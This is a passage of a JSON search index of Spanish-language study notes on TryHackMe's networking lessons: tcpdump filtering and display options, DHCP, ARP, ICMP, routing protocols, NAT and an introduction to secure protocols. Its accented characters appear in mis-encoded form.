archivo `data.pcap`.\n- `tcpdump -i any -nn`: Captura paquetes hasta que sea parado de todas las interfaces de red disponibles y elimina la resoluci√≥n de direcciones IP y puertos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "El mayor reto cuando estudiamos los protocolos es que no tenemos acceso a las \"conversaciones\" de estos. Todo queda detr√°s de interfaces de usuario. La mejor pr√°ctica es capturar el tr√°fico de la red y mirar de cerca los protocolos.\n\nEsta unidad introduce algunos comandos usados para Tcpdump. La herramienta Tcpdump y su librer√≠a `libpcap` est√°n escritas en C y C++, lanzadas a finales de los 1980s y principio de los 1990s. La librer√≠a `libpcap` fue llevada a Windows MS como `winpcap`.\n\n----------------\n<h2>Objetivos de Aprendizaje</h2>\nEsta unidad intenta ofrecerte conocimientos necesarios b√°sicos sobre `tcpdump`:\n\n- Capturar paquetes y guardarlos en un archivo.\n- Establecer filtros en los paquetes capturados.\n- Controlar c√≥mo se muestran los paquetes capturados.\n\n-----------------\n<h2>Pre-requisitos</h2>\nSe recomienda estar familiarizado con el modelo TCP/IP, sus conceptos relacionados y sus numerosos protocolos.\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Tcpdump - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/0-tcpdump-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/0. Tcpdump - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/1. Introduction]]\n[[2. Basic Packet Capture]]\n[[3. Filtering Expressions]]\n[[4. Advanced Filtering]]\n[[5. Displaying Packets]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Filtering Expressions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/3-filtering-expressions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/3. Filtering Expressions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Aunque puedes ejecutar `tcpdump` sin ninguna expresi√≥n de filtrado, esto no ser√° √∫til. Justo como en un encuentro social, no tratar√°s de escuchar a todo el mundo a la vez, sino que centrar√°s tu escucha en una persona o conversaci√≥n.\n\n-------------------\n<h2>Filtrar por Host</h2>\nDigamos que s√≥lo estamos interesados en un IP. Podemos limitar los paquetes capturados usando  `host <IP>` o `host <hostname>`.\n\nSi quieres limitar a los paquetes salientes de una direcci√≥n en concreto debes usar `src host <IP>` o `src host <hostname>`. De igual manera, puedes limitar a aquellos paquetes que llegan a una direcci√≥n concreta usando `dst host <IP>` o `dst host <hostname>.\n\n-------------\n<h2>Filtrar por Puerto</h2>\nSi quieres capturar todo el tr√°fico DNS, puedes filtrar la captura al puerto 53, por ejemplo. Para hacerlo usamos `port <puerto>`. Al igual que con el host, podemos aplicar filtrado de direcci√≥n (fuente o destino) con `src port <puerto>` y `dst port <puerto>`.\n\n----------------\n<h2>Filtrar por Protocolo</h2>\nEl tipo final de filtrado que cubriremos es filtrar por protocolo. Podemos filtrar a un tipo espec√≠fico de protocolo como por ejemplo `ip`, `ip6`, `udp`, `tcp` o `icmp`. Si filtramos por `icmp` y vemos un `time exceeded` es probable que se deba a que alguien est√° usando el comando `traceroute`, mientras que si vemos un `echo` es probable que alguien est√© usando el comando `ping`.\n\nPodemos usarlo simplemente escribiendo el protocolo.\n\n-------------\n<h2>Operadores L√≥gicos</h2>\nTres operadores l√≥gicos que pueden ser de ayuda:\n\n- `and`: Captura paquetes donde las dos condiciones se cumplan. Por ejemplo, `tcpdump host 1.1.1.1 and tcp` capturar√° tr√°fico TCP con host `1.1.1.1`.\n- `or`: Captura paquetes donde una de las dos condiciones se cumpla. Por ejemplo, `tcpdump udp or icmp` capturar√° tr√°fico UDP o ICMP.\n- `not`: Captura paquetes cuando la condici√≥n no es cierta. Por ejemplo, `tcpdump not tcp` capturar√° todos los paquetes menos los TCP.\n\n---------------\n<h2>Resumen y Ejemplos</h2>\nUna tabla con las cosas que hemos aprendido:\n\n| Comando                                      | Explicaci√≥n                                            |\n| -------------------------------------------- | ------------------------------------------------------ |\n| `tcpdump host IP` or `tcpdump host HOSTNAME` | Filtra paquetes por direcci√≥n IP o nombre de host.     |\n| `tcpdump src host IP` or                     | Filtra paquetes provenientes de una cierta direcci√≥n.  |\n| `tcpdump dst host IP`                        | Filtra paquetes destinados a una direcci√≥n.            |\n| `tcpdump port PORT_NUMBER`                   | Filtra paquetes por n√∫mero de puerto.                  |\n| `tcpdump src port PORT_NUMBER`               | Filtra paquetes provenientes de un puerto determinado. |\n| `tcpdump dst port PORT_NUMBER`               | Filtra paquetes destinados a un cierto puerto.         |\n| `tcpdump PROTOCOL`                           | Filtra paquetes por protocolo.                         |\nAlgunos ejemplos:\n\n- `tcpdump -i any tcp port 22`: Escucha en todas las interfaces y captura paquetes `tcp` desde o a el puerto 22 (SSH).\n- `tcpdump -i wlo1 udp port 123`: Escucha en la interfaz `wlo1` y captura paquetes `udp` provenientes o dirigidos al puerto 123 (Network Time Protocol, NTP).\n- `tcpdump -i eth0 host example.com and tcp port 443 -w hhts.pcap`: Escuchar√° en `eth0` hasta que sea interrumpido los paquetes relacionados con `example.com` y aquellos que tengan como salida o destino el puerto 443 y los meter√° en un archivo llamado `https.pcap`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Advanced Filtering",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/4-advanced-filtering/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/4. Advanced Filtering.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Hay muchas m√°s maneras de filtrar paquetes.  En una situaci√≥n real puede que necesitemos filtrar entre miles o millones de paquetes. Es indispensable poder expresar exactamente qu√© paquetes mostrar. Por ejemplo aquellos mayores o menores de un cierto tama√±o:\n\n- `greater <length>`: Filtra paquetes que tienen una longitud superior a la establecida.\n- `less <length>`: Filtra paquetes que tienen una longitud menor a la establecida.\n\nEs recomendable consultar la p√°gina de manual de `pcap-filter` usando `man pcap-filter`. De todas formas, nos centraremos en filtrar bas√°ndonos en las flags TCP.\n\n------------\n<h2>Operaciones Binarias</h2>\nUna operaci√≥n binaria trabaja en bits. Esta coge dos bits como entrada (0 o 1) y devuelve un solo bit. A continuaci√≥n una tabla:\n\n| Input 1 | Input 2 | & (and) | \\| (or) |\n| ------- | ------- | ------- | ------- |\n| 0       | 0       | 0       | 0       |\n| 0       | 1       | 0       | 1       |\n| 1       | 0       | 0       | 1       |\n| 1       | 1       | 1       | 1       |\n\n| Input 1 | ! (not) |\n| ------- | ------- |\n| 0       | 1       |\n| 1       | 0       |\n\n------------------\n<h2>Header Bytes</h2>\nEl objetivo de este apartado es aprender a filtrar paquetes en funci√≥n de los contenidos de un header byte. Consideremos los protocolos estudiados: ARP; Ethernet, ICMP, IP, TCP y UDP.\n\nUsando `pcap-filter`, tcpdump permite referirnos a los contenidos de cualquier byte header usando la siguiente sintaxis: `proto[expr:size]`.\n\n- `proto`: Refiere el protocolo (`arp`, `eter`, `icmp`, `ip`, `ip6`, `tcp`, `udp`).\n- `expr`: Indica el byte offset, donde `0` se refiere al primer byte.\n- `size`: Indica el n√∫mero de bytes que nos interesa. Es `1` por defecto.\n\nConsideremos los siguientes ejemplos:\n\n- `ether[0] & 1 != 0`: Coge el primer byte en el header `Ethernet` y el n√∫mero decimal 1 y retorna `True` siempre que el resultado sea distinto de 0. El prop√≥sito de este filtro es mostrar paquetes que hayan sido mandados a una direcci√≥n multicast (una direcci√≥n que identifica a un grupo  de dispositivos en una red).\n- `ip[0] & 0xf != 5`: Coge el primer byte del header `ip` y lo compara con el n√∫mero hexadecimal F (15). Devuelve `True` si el resultado no es igual al numero decimal 5. El prop√≥sito de este filtro es coger todos los paquetes IP con opciones.\n\nEstos ejemplos son complicados y no es necesario entenderlos completamente. Podemos usar `tcp[tcpflags]` para referirnos al campo de las flags. Aqu√≠ algunas flags:\n\n- `tcp-syn`: TCP SYN (Sincronizar).\n- `tcp-ack`: TCP ACK (Reconocer).\n- `tcp-fin`: TCP FIN (Finalizar).\n- `tcp-rst`: TCP RST (Resetear).\n- `tcp-push`: TCP Push\n\nBasado en lo de arriba, podemos escribir:\n\n- `tcpdump \"tcp[tcpflags] == tcp-syn\"`: Para capturar paquetes TCP s√≥lo con la flag SYN establecida.\n- `tcpdump \"tcp[tcpflags] & tcp-syn != 0\"`: Para capturar paquetes TCP con **al menos** la flag SYN establecida.\n- `tcpdump \"tcp[tcpflags] & (tcp-syn | tcp-ack) != 0\"`: Para capturar paquetes TCP con **al menos** la flag SYN o ACK establecidas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Displaying Packets",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/5-displaying-packets/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/5. Displaying Packets.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Tcpdump es un programa rico con muchas opciones para personalizar c√≥mo los paquetes se muestran. Hemos seleccionado las siguientes opciones para ense√±ar:\n\n- `-q`: R√°pido (quick), muestra informaci√≥n resumida.\n- `-e`: Muestra el header de link-level.\n- `-A`: Muestra la informaci√≥n del paquete en ASCII.\n- `-xx`: Muestra la informaci√≥n del paquete en formato hexadecimal.\n- `-X`: Muestra los headers y la informaci√≥n en hexadecimal y ASCII.\n\n---------------------\n<h2>Informaci√≥n de Paquete Reducida</h2>\nSi prefieres lineas m√°s reducidas la opci√≥n `-q` es ideal. Se muestra algo as√≠:\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -q \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 IP 104.18.12.149.https > g5000.45248: tcp 25 \n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: tcp 29\n```\n\n------------------\n<h2>Mostrando la Cabecera Link-Level</h2>\nSi est√°s en una red WiFi o Ethernet y quieres incluir las direcciones MAC, todo lo que necesitas hacer es `-e`.\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -e \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 44:df:65:d8:fe:6c (oui Unknown) > 02:83:1e:40:5d:17 (oui Unknown), ethertype IPv4 (0x0800), length 91: 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25 \n18:59:59.980574 02:83:1e:40:5d:17 (oui Unknown) > 44:df:65:d8:fe:6c (oui Unknown), ethertype IPv4 (0x0800), length 95: g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29\n```\n\n-----------------\n<h2>Mostrando Paquetes en ASCII</h2>\nASCII significa American Standard Code for Information Interchange, representa texto. Convierte los bytes a s√≠mbolos del alfabeto ingl√©s.\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -A \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 IP 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25 \nE..M..@.5..)h.....BY.......|.;5}........... ..1...k......j.3.2.....&9a.....-L\n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29\nE..Ql.@.@.VV..BYh........;5}............... ..k...1.......1.y.&VC<#._J$..z...D#.`\n```\n\n-----------\n<h2>Mostrando Paquetes en Formato Hexadecimal</h2>\nEl formato ASCII funciona bien cuando el contenido es texto en ingl√©s, pero no funcionar√° si ha sido encriptado o comprimido. Aqu√≠ entra en juego el hexadecimal. Para ello usamos `-xx`.\n\n ```bash\n user@TryHackMe$ tcpdump -r TwoPackets.pcap -xx \n reading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n 18:59:59.979771 IP 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25         \n\t 0x0000:  0283 1e40 5d17 44df 65d8 fe6c 0800 4500         \n\t 0x0010:  004d fbd8 4000 3506 d229 6812 0c95 c0a8         \n\t 0x0020:  4259 01bb b0c0 a0b1 037c aa3b 357d 8018         \n\t 0x0030:  0010 f905 0000 0101 080a 189a 310d ebfa         \n\t 0x0040:  6b2e 1703 0300 146a 8f33 1832 e6a2 fb99         \n\t 0x0050:  eb26 3961 dad4 1611 152d 4c \n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29         \n\t0x0000:  44df 65d8 fe6c 0283 1e40 5d17 0800 4500         \n\t0x0010:  0051 6ca8 4000 4006 5656 c0a8 4259 6812         \n\t0x0020:  0c95 b0c0 01bb aa3b 357d a0b1 0395 8018         \n\t0x0030:  087f 17e0 0000 0101 080a ebfa 6be8 189a         \n\t0x0040:  310d 1703 0300 18f4 31fa 798d 2656 433c         \n\t0x0050:  2389 5f4a 24c2 fa7a 1496 8444 238e 60\n ```\n\n----------------\n<h2>Lo Mejor de Ambos Mundos</h2>\nSi quieres mostrarlo en hexadecimal y ASCII, usa `-X`.\n\n-------------\n<h2>Resumen y Ejemplos</h2>\nUna tabla con algunos comandos aprendidos:\n\n| Comando       | Explicaci√≥n                                  |\n| ------------- | -------------------------------------------- |\n| `tcpdump -q`  | Informaci√≥n resumida.                        |\n| `tcpdump -e`  | A√±ade direcci√≥n MAC.                         |\n| `tcpdump -A`  | Muestra el contenido en ASCII.               |\n| `tcpdump -xx` | Muestra el contenido en hexadecimal.         |\n| `tcpdump -X`  | Muestra el contenido en hexadecimal y ASCII. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. DHCP - Give Me My Network Settings",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/2-dhcp-give-me-my-network-settings/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/2. DHCP - Give Me My Network Settings.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Cuando vas, por ejemplo, a una cafeter√≠a. Abres tu ordenador y √©ste, autom√°ticamente recibe una direcci√≥n IP y de esta manera puedes conectarte a Internet sin tener que haber hecho nada.\n\nCuando queremos acceder a una red, al menos necesitamos configurar:\n\n- Direcci√≥n IP con su correspondiente m√°scara de subred.\n- Router o gateway.\n- Servidor DNS.\n\nConfigurar estas manualmente es una buena opci√≥n, sobre todo para servidores. Estos no necesitan moverse, adem√°s, la gente que quiere conectarse a ellos espera hacerlo en una IP fija.\n\nDe todas formas, tener una forma automatizada de hacer esto es muy buena opci√≥n para dispositivo m√≥viles, pues evita trabajo y conflictos de coincidencia, que dejar√≠an a uno de los dispositivos sin poder acceder a la red.\n\nLa soluci√≥n para esto es DHCP, un protocolo que se basa en UDP. El servidor escucha UDP en el puerto 67 y el cliente manda desde UDP puerto 68.\n\nDHCP sigue cuatro pasos: Descubrir, ofrecer, pedir y reconocer.\n\n![[72.jpg]]\n\n1. Discover: El cliente bropadcastea un mensaje DHCPDICOVER buscando el servidor local DHCP si existe.\n2. Offer: EL servidor le responde con un mensaje DHCPOFFER con la direcci√≥n IP disponible.\n3. Request: El cliente responde con DHCPREQUEST para indicar que acepta la direcci√≥n IP asignada.\n4. Acknowledge: El servidor responde con un mensaje DHCPACK para confirmar que la direcci√≥n IP se le ha sido asignada al cliente.\n\n![[073.jpg]]\n\nEl cliente empieza la conexi√≥n sin direcci√≥n IP, s√≥lo MAC. En el primer y tercer paso no tiene IP todav√≠a. El cliente se comunica desde la \"IP\" `0.0.0.0` y manda la comunicaci√≥n junto con la MAC a la broadcast: `255.255.255.255`. \n\nAl final del proceso DHCP, el dispositivo ha recibido:\n\n- La IP para acceder a recursos en la red.\n- La gateway para routear los paquetes fuera de la red.\n- Un servidor DNS para resolver nombres de dominios.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "¬øAlguna vez te has preguntado c√≥mo tu ordenador configura de manera din√°mica los ajustes de red? ¬øHas querido saber por cu√°ntos dispositivos y pa√≠ses han pasado tus paquetes antes de llegar a su destino? ¬øTienes curiosidad por saber c√≥mo todos tus dispositivos pueden  acceder a Internet aunque tu ISP s√≥lo te da una direcci√≥n IP?\n\nEsta lecci√≥n es la segunda de una serie de cuatro sobre el networking:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n-----------------\n<h2>Pre-requisitos</h2>\n- [[2. OSI Model]]\n- [[3. TCP-IP Model]]\n- [[5. UDP and TCP]]\n- [[0. Networking Concepts]]\n\n----------------\n<h2>Objetivos de aprendizaje</h2>\nEn esta lecci√≥n aprenderemos:\n\n- DHCP (Dynamic Host Configuration Protocol).\n- ARP (Address Resolution Protocol).\n- NAT (Network Address Translation).\n- ICMP (Internet Control Message Protocol).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. ICMP - Troubleshooting Networks",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/4-icmp-troubleshooting-networks/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/4. ICMP - Troubleshooting Networks.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "El ICMP es usado principalmente para la diagnosis de la red y reporte de errores. Dos comandos populares recaen en ICMP, y son instrumentales en la resoluci√≥n de problemas de red y seguridad de esta. Los comandos son:\n\n- `ping`: Este comando usa ICMP para comprobar la conectividad de un sistema objetivo y mide el RTT (Round-Trip Time).\n- `traceroute`: Este comando es llamado as√≠ en sistemas UNIX y `tracert` en sistemas MS Windows. Usa ICMP para descubrir la ruta entre t√∫ y tu destino.\n\n-----------------\n<h2>Ping</h2>\nA lo mejor nunca has jugado al ping-pong, pero gracias a `ping` ahora puedes hacerlo con un ordenador. El comando `ping` manda una petici√≥n echo mediante ICMP (tipo 8).\n\n![[076.png]]\n\nEl ordenador que lo recibe devuelve un \"pong\", una petici√≥n echo mediante ICMP (tipo 0).\n\n![[077.png]]\n\nMuchas cosas pueden interrumpir el ping. Adem√°s del hecho de que pueda estar offline o apagado, un firewall puede estar bloqueando el tr√°fico necesario para que `ping` funcione.\n\n--------------\n<h2>Traceroute</h2>\n¬øC√≥mo podemos hacer que cada router entre nuestro sistema y el objetivo se identifique?\n\nEl protocolo de Internet tiene un campo llamado TTL (Time To Live). que indica el m√°ximo n√∫mero de routers por el que un paquete puede viajar antes de ser descartado. El router decrementa el TTL en uno antes de mandarlo. Cuando el paquete llega a TTL 0, el router lo descarta y manda un ICMP Time Exceeded (tipo 11). En este contexto, el tiempo se mide en routers, no en segundos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Networking Essentials",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/0-networking-essentials/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/0. Networking Essentials.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/1. Introduction]]\n[[2. DHCP - Give Me My Network Settings]]\n[[3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing]]\n[[4. ICMP - Troubleshooting Networks]]\n[[5. Routing]]\n[[6. NAT]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/3-arp-bridging-layer-3-addressing-to-layer-2-addressing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Hemos hablado de que cuando dos hosts se comunican por una red, un paquete IP es encapsulado cuando pasa por la capa 2. Acu√©rdate que las dos capas de link m√°s comunes son el Ethernet (IEEE 802.3) y la WiFi (IEEE 802.11). Aunque se conozca la IP de destino, necesita comprobar su MAC para que el paquete correcto sea creado.\n\nDe cualquier forma, los dispositivos en la misma red de Ethernet, no necesitan saber la MAC del otro todo el rato, s√≥lo mientras se comunican.\n\nDebajo podemos ver un paquete IP en un marco de Ethernet que contiene:\n\n- Direcci√≥n MAC de destino.\n- Direcci√≥n MAC de origen.\n- Tipo (IPv4 en este caso).\n\n![[074.png]]\n\nEl ARP hace posible encontrar la direcci√≥n MAC de otro dispositivo en Ethernet. En el ejemplo de abajo, un host con IP `192.168.66.89` quiere comunicarse con otro sistema con la IP `192.168.66.1`. Manda una petici√≥n ARP pidiendo al host `192.168.66.1` que responda y este lo hace con su direcci√≥n MAC.\n\n```bash\nuser@TryHackMe$ tshark -r arp.pcapng -Nn     \n1 0.000000000 cc:5e:f8:02:21:a7 ‚Üí ff:ff:ff:ff:ff:ff ARP 42 Who has 192.168.66.1? Tell 192.168.66.89     \n2 0.003566632 44:df:65:d8:fe:6c ‚Üí cc:5e:f8:02:21:a7 ARP 42 192.168.66.1 is at 44:df:65:d8:fe:6c\n```\n\nSi usamos `tcpdump` en vez de `tshark`, los paquetes se mostrar√°n con un formato diferente, con request y reply:\n\n```bash\nuser@TryHackMe$ tcpdump -r arp.pcapng -n -v \n17:23:44.506615 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.66.1 tell 192.168.66.89, length 28 \n17:23:44.510182 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.66.1 is-at 44:df:65:d8:fe:6c, length 28\n```\n\nUna petici√≥n ARP no se encapsula en un UDP o paquete IP, sino que es encapsulada directamente en un marco Ethernet como muestra la foto:\n\n![[075.png]]\n\nARP se considera capa 2 porque trabaja con direcciones MAC. Otros discutir√≠an que es parte de la capa 3 porque soporta operaciones IP. Lo que es esencial saber es que ARP permite la traducci√≥n del direccionamiento de la capa 3 al direccionamiento de la capa 2.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Routing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/5-routing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/5. Routing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "¬øC√≥mo puede Internet averiguar c√≥mo llevar los paquetes de la red X a la red Y o a la red Z? Necesitamos alg√∫n algoritmo.\n\nInternet se compone de millones de routers y billones de dispositivos. La red de la imagen de abajo es una peque√±a subred de Internet. Necesitamos un algoritmo de routeado para averiguar qu√© camino tomar.\n\n![[078.jpg]]\n\nLos algoritmos no entran en el temario, pero de cualquier forma, describiremos brevemente unos cuantos protocolos para familiarizarnos:\n\n- OSPF (Open Shortest Path First): Es un protocolo que les permite a los routers compartir informaci√≥n sobre su topolog√≠a y as√≠ calcular la ruta abierta m√°s corta.\n- EIGRP (Enhanced Interior Gateway Routing Protocol): Es un protocolo propiedad de Cisco que permite que los routers compartan informaci√≥n sobre a qu√© redes pueden acceder y cu√°nto cuesta (en t√©rminos de ancho de banda, por ejemplo) de tal forma que se puede calcular la ruta m√°s eficiente.\n- BGP (Border Gateway Protocol): Es el protocolo primario usado en Internet. Permite a diferentes redes intercambiar informaci√≥n y establecer caminos eficientes.\n- RIP (Routing Information Protocol): Es un protocolo simple usado normalmente en redes peque√±as. Comparten informaci√≥n sobre las redes a las que pueden acceder y los saltos necesarios para llegar all√≠.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. NAT",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/6-nat/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/6. NAT.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Como ya hemos hablado, IPv4 puede soportar hasta 4 billones de dispositivos a la vez como m√°ximo. Con el incremento en dispositivos por usuario este n√∫mero se ha quedado peque√±o. Una soluci√≥n a esto es NAT.\n\nLa idea detr√°s de NAT es que una IP p√∫blica pueda dar acceso a Internet a varias IPs privadas, de tal manera que una empresa con 20 ordenadores puede conectarlos todos a Internet mediante una sola IP p√∫blica.\n\nLos routers adaptados a NAT, deben tener una manera de rastrear paquetes en conexiones, por eso tienen una tabla que traduce entre direcciones internas y externas. Generalmente la red interna usa direcciones IP privadas mientras que la externa, p√∫blicas.\n\nAbajo un ejemplo. El port√°til `192.168.0.129` al establecer una conexi√≥n con el servidor, estar√° desde su punto de vista haci√©ndolo desde esta misma IP y el puerto `15401`. Sin embargo, para el servidor, esta conexi√≥n estar√° siendo realizada desde `212.3.4.5` y puerto `19273`.\n\n![[079.jpg]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En la lecci√≥n anterior aprendimos sobre los protocolos usados para navegar por Internet y acceder a mail. Esto son geniales, pero no pueden proteger la confidencialidad, integridad o autenticidad de la informaci√≥n transmitida.\n\nTLS (Transport Layer Security) es a√±adido a los protocolos existentes de comunicaciones, transformando HTTP, POP3, SMTP e IMAP en HTTPS, POP3S, SMTPS e IMAPS siendo la S referente a \"Secure\".\n\n--------------------\n<h2>Pre-requisitos</h2>\nEsta lecci√≥n es la √∫ltima del grupo de cuatro formado por:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n-------------------\n<h2>Objetivos de aprendizaje</h2>\n- SSL/TLS\n- Como securizar los protocolos de texto plano existentes como:\n\t- HTTP\n\t- SMTP\n\t- POP3\n\t- IMAP\n- C√≥mo SSH reemplaz√≥ a telnet\n- C√≥mo VPN crea una red segura",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Networking Secure Protocols",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/0-networking-secure-protocols/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/0. Networking Secure Protocols.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/1. Introduction]]\n[[2. TLS]]\n[[3. HTTPS]]\n[[4. SMPTS, POP3S and IMAPS]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/5. SSH]]\n[[6. SFTP and FTPS]]\n[[7. VPN]]\n[[8. Closing notes + Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. VPN",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/7-vpn/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/7. VPN.md",
